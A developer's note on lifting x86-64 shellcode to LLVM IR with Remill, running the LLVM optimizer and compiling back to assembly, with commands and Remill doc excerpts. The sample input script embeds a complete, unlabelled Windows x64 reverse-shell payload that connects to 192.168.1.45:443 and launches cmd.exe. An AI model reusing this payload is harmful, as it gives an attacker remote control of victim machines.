# Minimizing with LLVM and Remill

Before doing function & basic block analysis, id want to "minimize"
or "standardize" the function code. My idea was to use the LLVM
optimizer. This requires the assembly code to be lifted to LLVM-IR.

Even tho it looks like Remill could lift X86 assembly to 
LLVM-IR, it does it in a way which makes it unusable for my purpose. 

It plays tricks to implement low level architectural implementation 
details by implementing them with basically function calls to a 
architecture independant emulator. Basically, all the `__remil_*`
calls will be compiled to ASM too. It bloats the produced and
"optimized" ASM. 

There dont really seem to be projects which can do the X86->LLVM-IL
lifting. LLVM-IL seems to be unsuitable for this job. 


## Lift to LLVM-IL

Note: Install LLVM 16 manually. Use same version in the remill docker container and on your local machine. 


`printshellcode.py`:
```
import sys
buf =  b"\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d"
buf += b"\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01"
buf += b"\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01"
buf += b"\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31"
buf += b"\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45"
buf += b"\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b"
buf += b"\x04\x8b\x4c\x01\xc8\xc3\xc3\x4c\x89\xcd\x41\xb8\x8e\x4e\x0e\xec\xe8\x8f\xff\xff"
buf += b"\xff\x49\x89\xc4\x48\x31\xc0\x66\xb8\x6c\x6c\x50\x48\xb8\x57\x53\x32\x5f\x33\x32"
buf += b"\x2e\x64\x50\x48\x89\xe1\x48\x83\xec\x20\x4c\x89\xe0\xff\xd0\x48\x83\xc4\x20\x49"
buf += b"\x89\xc6\x49\x89\xc1\x41\xb8\xcb\xed\xfc\x3b\x4c\x89\xcb\xe8\x55\xff\xff\xff\x48"
buf += b"\x31\xc9\x66\xb9\x98\x01\x48\x29\xcc\x48\x8d\x14\x24\x66\xb9\x02\x02\x48\x83\xec"
buf += b"\x30\xff\xd0\x48\x83\xc4\x30\x49\x89\xd9\x41\xb8\xd9\x09\xf5\xad\xe8\x2b\xff\xff"
buf += b"\xff\x48\x83\xec\x30\x48\x31\xc9\xb1\x02\x48\x31\xd2\xb2\x01\x4d\x31\xc0\x41\xb0"
buf += b"\x06\x4d\x31\xc9\x4c\x89\x4c\x24\x20\x4c\x89\x4c\x24\x28\xff\xd0\x49\x89\xc4\x48"
buf += b"\x83\xc4\x30\x49\x89\xd9\x41\xb8\x0c\xba\x2d\xb3\xe8\xf3\xfe\xff\xff\x48\x83\xec"
buf += b"\x20\x4c\x89\xe1\x48\x31\xd2\xb2\x02\x48\x89\x14\x24\x48\x31\xd2\x66\xba\x01\xbb"
buf += b"\x48\x89\x54\x24\x02\xba\xc0\xa8\x01\x2d\x48\x89\x54\x24\x04\x48\x8d\x14\x24\x4d"
buf += b"\x31\xc0\x41\xb0\x16\x4d\x31\xc9\x48\x83\xec\x38\x4c\x89\x4c\x24\x20\x4c\x89\x4c"
buf += b"\x24\x28\x4c\x89\x4c\x24\x30\xff\xd0\x48\x83\xc4\x38\x49\x89\xe9\x41\xb8\x72\xfe"
buf += b"\xb3\x16\xe8\x99\xfe\xff\xff\x48\xba\x9c\x92\x9b\xd1\x9a\x87\x9a\xff\x48\xf7\xd2"
buf += b"\x52\x48\x89\xe2\x41\x54\x41\x54\x41\x54\x48\x31\xc9\x66\x51\x51\x51\xb1\xff\x66"
buf += b"\xff\xc1\x66\x51\x48\x31\xc9\x66\x51\x66\x51\x51\x51\x51\x51\x51\x51\xb1\x68\x51"
buf += b"\x48\x89\xe7\x48\x89\xe1\x48\x83\xe9\x20\x51\x57\x48\x31\xc9\x51\x51\x51\x48\xff"
buf += b"\xc1\x51\xfe\xc9\x51\x51\x51\x51\x49\x89\xc8\x49\x89\xc9\xff\xd0"
sys.stdout.write(buf.hex())
```
Use remill to lift the shellcode into LLVM-IL:

```
$ podman run --rm -it remill --arch amd64 --ir_out /dev/stdout --bytes "`python3 ./printshellcode
.py`" > shellcode.ll

$ head -n 4 shellcode.ll
; ModuleID = 'lifted_code'
source_filename = "lifted_code"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu-elf"
```

Compile the LLVM-IL to LLVM-Bitcode: 
`llvm-as is the LLVM assembler.  It reads a file containing human-readable LLVM assembly language, translates it to LLVM bitcode, and writes the result into a file or to standard output.`
```
$ llvm-as-16 shellcode.ll
$ ls -l shellcode.bc
-rw-r--r-- 1 dobin dobin 38440 Sep 11 09:34 shellcode.bc
```

Optimize LLVM-Bitcode:
`The opt command is the modular LLVM optimizer and analyzer.  It takes LLVM source files as input runs the specified optimizations or analyses on it, and then outputs the optimized file.`
```
$ opt-16 shellcode.bc > shellcode-opt.bc
```

Compile LLVM-Bitcode back to x64 assembly:
`The llc command compiles LLVM source inputs into assembly language for a specified architecture.`
```
$ llc-16 -filetype=asm shellcode-opt.bc -o shellcode-opt.asm
```

Note: The resulting `shellcode-opt.asm` will be extremely bloated, 
and basically unusable (see "Remill" below). 

And: 
* llvm-mc: llvm machine code playground
* llvm-dis: LLVM disassembler (bitcode -> LLVM assembly)


# Remill

https://github.com/lifting-bits/remill/blob/master/docs/LIFE_OF_AN_INSTRUCTION.md

## One

;; mov ebx, dword ptr [esp + 8]
(X86 804809e 4 (BYTES 8b 5c 24 08)
  MOV_GPRv_MEMv_32
    (WRITE_OP (REG_32 EBX))
    (READ_OP  (DWORD_PTR (ADD (REG_32 SS_BASE)
                              (REG_32 ESP)
                              (SIGNED_IMM_32 0x8)))))


## Two

Memory *__remill_basic_block_804b7a3(State *state, addr_t pc, Memory *memory) {
  auto &EIP = state.gpr.rip.dword;
  auto &EAX = state.gpr.rax.dword;
  auto &EBX = state.gpr.rbx.dword;
  auto &ESP = state.gpr.rsp.dword;

  // mov    eax, 0x1
  EAX = 1;

  // push   ebx
  ESP -= 4;
  memory = __remill_write_memory_32(memory, ESP, EBX);

  // mov    ebx, dword [esp+0x8]
  EBX = __remill_read_memory_32(memory, ESP + 0x8);

  // int    0x80
  state.hyper_call = AsyncHyperCall::kX86IntN;
  state.interrupt_vector = 0x80;

  EIP = pc + 12;

  return __remill_async_hyper_call(state, EIP, memory)
}